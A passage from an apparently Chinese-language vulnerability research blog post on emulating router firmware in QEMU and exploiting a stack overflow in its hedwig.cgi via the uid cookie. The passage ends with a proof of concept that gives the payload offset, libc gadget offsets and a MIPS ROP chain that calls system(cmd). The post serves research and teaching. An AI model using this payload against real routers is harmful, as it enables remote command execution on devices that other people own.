class="line">foreach(&quot;&#x2F;runtime&#x2F;services&#x2F;http&#x2F;server&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    $model  &#x3D; query(&quot;&#x2F;runtime&#x2F;device&#x2F;modelname&quot;);</span><br><span class="line">    $ver    &#x3D; query(&quot;&#x2F;runtime&#x2F;device&#x2F;firmwareversion&quot;);</span><br><span class="line">    $smart404 &#x3D; query(&quot;&#x2F;runtime&#x2F;smart404&quot;);</span><br><span class="line">    $sname  &#x3D; &quot;Linux, HTTP&#x2F;1.1, &quot;.$model.&quot; Ver &quot;.$ver;  &#x2F;* HTTP server name *&#x2F;</span><br><span class="line">    $suname &#x3D; &quot;Linux, UPnP&#x2F;1.0, &quot;.$model.&quot; Ver &quot;.$ver;  &#x2F;* UPnP server name *&#x2F;</span><br><span class="line">    $mode   &#x3D; query(&quot;mode&quot;);</span><br><span class="line">    $inf    &#x3D; query(&quot;inf&quot;);</span><br><span class="line">    $ifname &#x3D; query(&quot;ifname&quot;);</span><br><span class="line">    $ipaddr &#x3D; query(&quot;ipaddr&quot;);</span><br><span class="line">    $port   &#x3D; query(&quot;port&quot;);</span><br><span class="line">    $hnap   &#x3D; query(&quot;hnap&quot;);</span><br><span class="line">    $widget &#x3D; query(&quot;widget&quot;);</span><br><span class="line">    $af     &#x3D; query(&quot;af&quot;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    if ($af!&#x3D;&quot;&quot; &amp;&amp; $ifname!&#x3D;&quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if      ($mode&#x3D;&#x3D;&quot;HTTP&quot;) http_server($sname, $inf,$ifname,$af,$ipaddr,$port,$hnap,$widget,$smart404);</span><br><span class="line">        else if ($mode&#x3D;&#x3D;&quot;SSDP&quot;) ssdp_server($sname, $inf,$ifname,$af,$ipaddr);</span><br><span class="line">        else if ($mode&#x3D;&#x3D;&quot;UPNP&quot;) upnp_server($suname,$inf,$ifname,$af,$ipaddr,$port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到这里用于生成配置文件<br>我们只需要其中的http服务<br>大致审一下function http_server<br>改写main为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$smart404 &#x3D; &quot;kirin&quot;;</span><br><span class="line">$sname	&#x3D; &quot;Linux, HTTP&#x2F;1.1, &quot;;	&#x2F;* HTTP server name *&#x2F;</span><br><span class="line">$inf	&#x3D; &quot;1234&quot;;</span><br><span class="line">$ifname	&#x3D; &quot;eth0&quot;;</span><br><span class="line">$ipaddr	&#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">$port	&#x3D; &quot;80&quot;;</span><br><span class="line">$hnap	&#x3D; 1;</span><br><span class="line">$widget &#x3D; 2;</span><br><span class="line">$af		&#x3D; &quot;kirin&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">http_server($sname, $inf,$ifname,$af,$ipaddr,$port,$hnap,$widget,$smart404);</span><br></pre></td></tr></table></figure>
<p>运行即可生成配置文件<br><strong>下面配置qemu system mode下配置MIPS虚拟机:</strong><br><strong>推荐ubuntu 12.04 32bit，其他的配置网卡容易失败</strong><br>下载内核和磁盘镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;mipsel&#x2F;</span><br><span class="line">内核：</span><br><span class="line">vmlinux-2.6.32-5-4kc-malta</span><br><span class="line">磁盘镜像：</span><br><span class="line">debian_squeeze_mipsel_standard.qcow2</span><br></pre></td></tr></table></figure>
<p>(最好的方案是使用提取出的文件系统制作镜像，然后qemu运行,不过失败了<br>只能采取使用MIPS虚拟机并配置对应Web服务)<br>配置MIPS虚拟机网卡（针对ubuntu 12.04 32bit,其他我没配置成功）：<br>首先安装依赖：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>
<p>编辑/etc/network/interfaces</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line">#auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">  bridge_ports eth0</span><br><span class="line">  bridge_maxwait 0</span><br></pre></td></tr></table></figure>
<p>保存后建立桥接网络：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ifdown eth0</span><br><span class="line">sudo ifup eth0</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure>
<p>编辑/etc/qemu-ifup为：<br>(这个脚本会在qemu-system使用时自动启动来配置qemu虚拟机网卡)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">echo &quot;Executing &#x2F;etc&#x2F;qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;brctl addif br0 $1</span><br><span class="line">sleep 2</span><br></pre></td></tr></table></figure>
<p>而后启动MIPS虚拟机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root&#x3D;&#x2F;dev&#x2F;sda1 console&#x3D;tty0&quot; -net nic,macaddr&#x3D;00:16:3e:00:00:01 -net tap -nographic</span><br></pre></td></tr></table></figure>
<p><strong>启动时虚拟机user&amp;&amp;passwd都是”root”</strong><br>此时ifconfig -a发现存在eth1，但没有分配ip：<br>编辑MIPS虚拟机的/etc/network/interfaces</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># This file describes the network interfaces available on your system</span><br><span class="line"># and how to activate them. For more information, see interfaces(5).</span><br><span class="line"></span><br><span class="line"># The loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line"># The primary network interface</span><br><span class="line">allow-hotplug eth1</span><br><span class="line">iface eth1 inet dhcp</span><br></pre></td></tr></table></figure>
<p>而后<strong>ifup eth1</strong>使eth1生效即可<br><strong>ifconfig -a看到成功分配ip(和ubuntu的br0 ip对应)</strong><br>下面在MIPS虚拟机中配置路由器web服务<br>这里有两种方法：</p>
<ul>
<li><strong>方法一  在ubuntu挂载磁盘镜像：</strong><br>利用libguestfs挂载qcow2磁盘镜像<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo guestmount  -a .&#x2F;debian_squeeze_mipsel_standard.qcow2 -m &#x2F;dev&#x2F;sda1 .&#x2F;point</span><br><span class="line">-a+磁盘镜像</span><br><span class="line">-m+需要挂载的磁盘分区</span><br><span class="line">最后+挂载位置</span><br><span class="line">#删除：sudo guestunmount  .&#x2F;point</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>而后在指定的文件夹下即可看到磁盘中的文件系统，将固件根目录的htdocs复制到镜像根目录<br>将etc目录复制到镜像根目录，直接复制即可，覆盖掉的文件没有什么作用<br>将固件lib下所需要的共享库复制到镜像libc下(libgcc_s.so版本不同，需要覆盖掉)：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ld-uClibc-0.9.30.1.so  </span><br><span class="line">libcrypt-0.9.30.1.so  </span><br><span class="line">libc.so.0    </span><br><span class="line">libgcc_s.so.1</span><br><span class="line">ld-uClibc.so.0         </span><br><span class="line">libcrypt.so.0         </span><br><span class="line">libgcc_s.so  </span><br><span class="line">libuClibc-0.9.30.1.so</span><br></pre></td></tr></table></figure>
<p>将httpd复制进镜像，并编写好配置文件(即上面php输出部分)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile &#x2F;var&#x2F;run&#x2F;httpd.pid</span><br><span class="line">#LogGMT On</span><br><span class="line">#ErrorLog &#x2F;dev&#x2F;console</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">	NumConnections 15</span><br><span class="line">	BufSize 12288</span><br><span class="line">	InputBufSize 4096</span><br><span class="line">	ScriptBufSize 4096</span><br><span class="line">	NumHeaders 100</span><br><span class="line">	Timeout 60</span><br><span class="line">	ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">	Types</span><br><span class="line">	&#123;</span><br><span class="line">		text&#x2F;html	&#123; html htm &#125;</span><br><span class="line">		text&#x2F;xml	&#123; xml &#125;</span><br><span class="line">		text&#x2F;plain	&#123; txt &#125;</span><br><span class="line">		image&#x2F;gif	&#123; gif &#125;</span><br><span class="line">		image&#x2F;jpeg	&#123; jpg &#125;</span><br><span class="line">		text&#x2F;css	&#123; css &#125;</span><br><span class="line">		application&#x2F;octet-stream &#123; * &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Specials</span><br><span class="line">	&#123;</span><br><span class="line">		Dump		&#123; &#x2F;dump &#125;</span><br><span class="line">		CGI			&#123; cgi &#125;</span><br><span class="line">		Imagemap	&#123; map &#125;</span><br><span class="line">		Redirect	&#123; url &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	External</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;usr&#x2F;sbin&#x2F;phpcgi &#123; php &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, HTTP&#x2F;1.1, &quot;</span><br><span class="line">	ServerId &quot;1234&quot;</span><br><span class="line">	Family kirin</span><br><span class="line">	Interface eth0</span><br><span class="line">	Address 127.0.0.1</span><br><span class="line">	Port 80</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias &#x2F;</span><br><span class="line">			Location &#x2F;htdocs&#x2F;web</span><br><span class="line">			IndexNames &#123; index.php &#125;</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				&#x2F;usr&#x2F;sbin&#x2F;phpcgi &#123; router_info.xml &#125;</span><br><span class="line">				&#x2F;usr&#x2F;sbin&#x2F;phpcgi &#123; post_login.xml &#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">       Control</span><br><span class="line">       &#123;</span><br><span class="line">           Alias &#x2F;smart404</span><br><span class="line">           Location &#x2F;htdocs&#x2F;smart404</span><br><span class="line">       &#125;</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias &#x2F;HNAP1</span><br><span class="line">			Location &#x2F;htdocs&#x2F;HNAP1</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				&#x2F;usr&#x2F;sbin&#x2F;hnap &#123; hnap &#125;</span><br><span class="line">			&#125;</span><br><span class="line">			IndexNames &#123; index.hnap &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>静态分析httpd程序，需要修改一些部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LogGMT On #开启log</span><br><span class="line">ErrorLog &#x2F;log  #log文件</span><br><span class="line"></span><br><span class="line">Family inet</span><br><span class="line">Interface eth1</span><br><span class="line">Address 192.168.160.142  &#x2F;&#x2F;对应自己qemu虚拟机IP</span><br><span class="line">Port 1234      &#x2F;&#x2F;未被占用的端口</span><br></pre></td></tr></table></figure>
<p>再重新挂载启动，流程和前面配置网络相同<br>根据配置及固件，还需要在MIPS虚拟机中建立两个软连接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s  &#x2F;htdocs&#x2F;cgibin &#x2F;usr&#x2F;sbin&#x2F;phpcgi</span><br><span class="line">ln -s  &#x2F;htdocs&#x2F;cgibin &#x2F;usr&#x2F;sbin&#x2F;hnap</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>方法二 SSH配置Web Server</strong><br>配置方法相同<br>配置好网络后，将需要的文件打包scp上传到MIPS虚拟机再解压即可</li>
</ul>
<p><strong>配置好虚拟机后根据conf启动httpd服务即可：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd  -f .&#x2F;conf</span><br></pre></td></tr></table></figure>
<p>检测是否成功<br>在物理机curl测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">~$ curl http:&#x2F;&#x2F;192.168.160.142:1232&#x2F;hedwig.cgi -v -X POST -H &quot;Content-Length: 8&quot; -b  &quot;uid&#x3D;kirin&quot; </span><br><span class="line">*   Trying 192.168.160.142...</span><br><span class="line">* Connected to 192.168.160.142 (192.168.160.142) port 1232 (#0)</span><br><span class="line">&gt; POST &#x2F;hedwig.cgi HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: 192.168.160.142:1232</span><br><span class="line">&gt; User-Agent: curl&#x2F;7.47.0</span><br><span class="line">&gt; Accept: *&#x2F;*</span><br><span class="line">&gt; Cookie: uid&#x3D;kirin</span><br><span class="line">&gt; Content-Length: 8</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP&#x2F;1.1 200 OK</span><br><span class="line">&lt; Server: Linux, HTTP&#x2F;1.1, </span><br><span class="line">&lt; Date: Thu, 21 Feb 2019 18:28:12 GMT</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Content-Type: text&#x2F;xml</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host 192.168.160.142 left intact</span><br><span class="line">&lt;hedwig&gt;&lt;result&gt;FAILED&lt;&#x2F;result&gt;&lt;message&gt;no xml data.&lt;&#x2F;message&gt;&lt;&#x2F;hedwig&gt;</span><br></pre></td></tr></table></figure>
<p>MIPS虚拟机下查看log:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mipsel:&#x2F;# cat &#x2F;log</span><br><span class="line">Thu Feb 21 18:28:12 2019 [3391] process_headers: method[POST], nheaders&#x3D;[4], URL[&#x2F;hedwig.cgi]</span><br><span class="line">Thu Feb 21 18:28:12 2019 [3391] readfromclient: client went away while posting data</span><br><span class="line">Thu Feb 21 18:28:12 2019 [3391] child process 3418 exited with status 255</span><br></pre></td></tr></table></figure>
<p><strong>Web Server Build Successfully</strong><br>(注意，这里并没有完全启动，因为毕竟整个固件有其他依赖，不过关键程序已成功启动)<br><strong>通过前面IDA下的静态分析，在MIPS虚拟机下也可以通过export设置HTTP_METHOD等环境变量来单一调用cgi程序</strong><br>For example：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mipsel:&#x2F;# export</span><br><span class="line">declare -x CONTENT_LENGTH&#x3D;&quot;20&quot;</span><br><span class="line">declare -x CONTENT_TYPE&#x3D;&quot;application&#x2F;x-www-form-urlencoded&quot;</span><br><span class="line">declare -x HOME&#x3D;&quot;&#x2F;root&quot;</span><br><span class="line">declare -x HTTP_COOKIE&#x3D;&quot;uid&#x3D;1234&quot;</span><br><span class="line">declare -x HUSHLOGIN&#x3D;&quot;FALSE&quot;</span><br><span class="line">declare -x LANG&#x3D;&quot;en_US.UTF-8&quot;</span><br><span class="line">declare -x LOGNAME&#x3D;&quot;root&quot;</span><br><span class="line">declare -x MAIL&#x3D;&quot;&#x2F;var&#x2F;mail&#x2F;root&quot;</span><br><span class="line">declare -x OLDPWD&#x3D;&quot;&#x2F;proc&quot;</span><br><span class="line">declare -x PATH&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;</span><br><span class="line">declare -x PWD&#x3D;&quot;&#x2F;&quot;</span><br><span class="line">declare -x REMOTE_ADDR&#x3D;&quot;192.168.1.1&quot;</span><br><span class="line">declare -x REQUEST_METHOD&#x3D;&quot;POST&quot;</span><br><span class="line">declare -x REQUEST_URI&#x3D;&quot;&#x2F;hedwig.cgi&quot;</span><br><span class="line">declare -x SHELL&#x3D;&quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">declare -x SHLVL&#x3D;&quot;1&quot;</span><br><span class="line">declare -x TERM&#x3D;&quot;vt100&quot;</span><br><span class="line">declare -x USER&#x3D;&quot;root&quot;</span><br><span class="line">root@debian-mipsel:&#x2F;# &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi </span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">#缺少POST数据</span><br><span class="line">&lt;hedwig&gt;&lt;result&gt;FAILED&lt;&#x2F;result&gt;&lt;message&gt;no xml data.&lt;&#x2F;message&gt;&lt;&#x2F;hedwig&gt;</span><br><span class="line">root@debian-mipsel:&#x2F;# echo &quot;uid&#x3D;1234&quot;|&#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi </span><br><span class="line">root@debian-mipsel:&#x2F;                #运行成功</span><br></pre></td></tr></table></figure>
<h2 id="Debug-amp-amp-POC编写"><a href="#Debug-amp-amp-POC编写" class="headerlink" title="Debug &amp;&amp; POC编写"></a>Debug &amp;&amp; POC编写</h2><p>QEMU User Mode+IDA debug即可<br>MIPS虚拟机下gdbserver总是crash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;debug.sh  &quot;uid&#x3D;1234&quot;  &#96;python -c &#39;printf &quot;uid&#x3D;&quot;+&quot;A&quot;*0x400&#39;&#96;  1234</span><br></pre></td></tr></table></figure>
<p><strong>主要通过IDA动态调试看到成功覆盖栈内返回地址($RA)<br>以及确定payload偏移量即可<br>最后利用MIPSROP插件构造ROP chain，这里注意sprintf绕过”\x00”即可，所以选取动态库(libc.so.0 -&gt; libuClibc-0.9.30.1.so)进行构造(因为位于高地址，容易绕过地址高位的”\x00”)：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在IDA 6.8中启动mipsrop插件，而后：</span><br><span class="line">mipsrop.stackfinders()</span><br><span class="line">选取特定的ROP elements：</span><br><span class="line">example: mipsrop.find(&quot;addiu $s0,1&quot;);&#x2F;&#x2F;参数为所需语句</span><br></pre></td></tr></table></figure>
<p>最终payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;A&quot;*offset                     #fill</span><br><span class="line">payload+&#x3D;p32(libc_addr+0x531ff)        # $s0</span><br><span class="line">payload+&#x3D;&quot;A&quot;*4                         # $s1</span><br><span class="line">payload+&#x3D;&quot;A&quot;*4                         # $s2</span><br><span class="line">payload+&#x3D;&quot;A&quot;*4                         # $s3</span><br><span class="line">payload+&#x3D;&quot;A&quot;*4                         # $s4</span><br><span class="line">payload+&#x3D;p32(libc_addr+0x159cc)	       # $s5 </span><br><span class="line">payload+&#x3D;&quot;A&quot;*4                         # $s6</span><br><span class="line">payload+&#x3D;&quot;A&quot;*4                         # $s7</span><br><span class="line">payload+&#x3D;&quot;A&quot;*4                         # $gp</span><br><span class="line">payload+&#x3D;p32(libc_addr+0x158c8)        # $ra</span><br><span class="line">payload+&#x3D;&quot;A&quot;*16                        #fill</span><br><span class="line">payload+&#x3D;cmd           			       # shellcode</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ra:libc_addr+0x158c8:</span><br><span class="line">.text:000158C8                 move    $t9, $s5</span><br><span class="line">.text:000158CC                 jalr    $t9</span><br><span class="line">.text:000158D0                 addiu   $s0, 1 #$s0&#x3D;$s0+1&#x3D;system_addr-1+1&#x3D;system_addr</span><br><span class="line">$s5&#x3D;libc_addr+0x159cc:</span><br><span class="line">.text:000159CC                 addiu   $s5, $sp, 0x170+var_160 #addiu  $s5,$sp,0x10</span><br><span class="line">#-&gt;$s5指向 $sp+0x10-&gt;cmd</span><br><span class="line">.text:000159D0                 move    $a1, $s3</span><br><span class="line">.text:000159D4                 move    $a2, $s1</span><br><span class="line">.text:000159D8                 move    $t9, $s0 #$t9&#x3D;$s0&#x3D;system_addr</span><br><span class="line">.text:000159DC                 jalr    $t9 </span><br><span class="line">.text:000159E0                 move    $a0, $s5#$a0&#x3D;$s5-&gt;cmd</span><br></pre></td></tr></table></figure>
<p>此ROP chain整体流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system_addr-1，末位为&quot;\xFF&quot;,用于bypass sprintf</span><br><span class="line">执行ROP chain-&gt;计算正确的system_addr-&gt;将栈中cmd地址传入$a0</span><br><span class="line">最终调用system(cmd)</span><br></pre></td></tr></table></figure>
<p>动态debug可以确定offset为0x3cd<br>libc_addr：<br>在ubuntu 16.04下qemu user mode动态调试<br>可以利用程序一些库中函数在调试中的实际地址减去so文件中该函数偏移量确定libc的加载基址<br>确定后，在qemu user mode下运行POC,确实会调用到system<br>不过：在so库中的system中可以看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 